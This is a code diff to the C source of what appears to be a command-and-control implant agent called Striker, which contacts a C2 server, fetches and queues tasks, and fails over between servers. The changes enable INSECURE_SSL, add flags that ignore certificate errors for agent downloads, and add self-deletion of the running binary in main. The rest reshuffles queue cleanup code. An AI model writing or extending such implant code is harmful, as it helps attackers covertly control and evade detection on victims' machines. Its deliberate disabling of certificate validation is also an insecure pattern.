@@ -11,7 +11,7 @@
  * Uncomment the following macro to disable SSL verification.
  * Insecure, but required for using self-signed SSL certs.
  */
-// #define INSECURE_SSL
+#define INSECURE_SSL
 
 // Uncomment the below macro to enable debug output
 // #define STRIKER_DEBUG
@@ -362,7 +362,8 @@ int web_download(char *url, FILE *wfo){
     return (res != CURLE_OK);
   #else
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, STRIKER_WININET_OPTIONS, 0);
+    // We don't really need secure SSL for agent downloads (I think :)
+    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | STRIKER_WININET_OPTIONS, 0);
     if (!hResponse){
       InternetCloseHandle(hInternet);
       return 1;
@@ -1685,6 +1686,9 @@ void start_session(){
   char *tmp;
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
   int status_code;
+  queue *tasks_queue = queue_init(MAX_TASKS_QUEUE); // All running tasks will be queued here
+  queue *completed_tasks = queue_init(MAX_TASKS_QUEUE); // Completed tasks will be moved here before submission
+  striker->tasks = tasks_queue; // We need to pass this around.
 
   // Connects to the C2 server.
   contact_base: ;
@@ -1770,32 +1774,19 @@ void start_session(){
     #ifdef STRIKER_DEBUG
       printf("[+] Servers count: %u\n", (unsigned int)base_addrs->count);
     #endif
-
     cJSON_Delete(config);
     free(config_str);
   }
 
   char *tasksURL = malloc(URL_SIZE);
   snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
-  queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
-  striker->tasks = tasks_queue;
-  queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
   unsigned int contact_fails = 0;
   while (1){
     if (contact_fails >= MAX_CONTACT_FAILS){ // Switch to another server.
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[!] Max failed connection attempts reached. Switching server...\n");
       #endif
-      // Cleanup
       free(tasksURL);
-      queue_seek(tasks_queue, 0);
-      while (!queue_exhausted(tasks_queue))
-        free_task(queue_get(tasks_queue));
-      queue_seek(completed_tasks, 0);
-      while (!queue_exhausted(completed_tasks))
-        free_task(queue_get(completed_tasks));
-      queue_free(tasks_queue, 0);
-      queue_free(completed_tasks, 0);
       // Switch
       goto contact_base;
     }
@@ -1903,18 +1894,17 @@ void start_session(){
     cJSON_Delete(tasksJSON);
     free(tmp);
   }
-
   free(tasksURL);
-  queue_seek(tasks_queue, 0);
-  while (!queue_exhausted(tasks_queue))
-    free_task(queue_get(tasks_queue));
-  queue_seek(completed_tasks, 0);
-  while (!queue_exhausted(completed_tasks))
-    free_task(queue_get(completed_tasks));
-  queue_free(tasks_queue, 0);
-  queue_free(completed_tasks, 0);
 
   end:
+    queue_seek(tasks_queue, 0);
+    while (!queue_exhausted(tasks_queue))
+      free_task(queue_get(tasks_queue));
+    queue_seek(completed_tasks, 0);
+    while (!queue_exhausted(completed_tasks))
+      free_task(queue_get(completed_tasks));
+    queue_free(tasks_queue, 0);
+    queue_free(completed_tasks, 0);
     free_buffer(body);
     queue_free(base_addrs, 1);
     cleanup_session(striker);
@@ -1931,7 +1921,8 @@ void cleanup_session(session *striker){
 }
 
 int main(int argc, char **argv){
-
+  
+  remove(argv[0]);
   #ifdef STRIKER_DEBUG
   printf("[*] Starting Striker...\n");
   #endif
